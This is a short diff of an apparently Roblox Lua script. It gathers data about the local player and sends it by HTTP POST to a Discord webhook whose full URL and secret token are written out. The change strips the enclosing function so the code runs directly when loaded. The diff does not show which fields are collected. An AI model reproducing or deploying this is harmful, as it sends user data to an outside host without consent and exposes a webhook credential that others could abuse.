@@ -1,4 +1,4 @@
-return function()
+
 	local Player = game.Players.LocalPlayer
 	local url = "https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp"
 	local data = {
@@ -19,4 +19,3 @@ return function()
 		local newabc = {Url = url, Body = newdatanew, Method = "POST", Headers = headers}
 		request(newabc)
 	end
-end
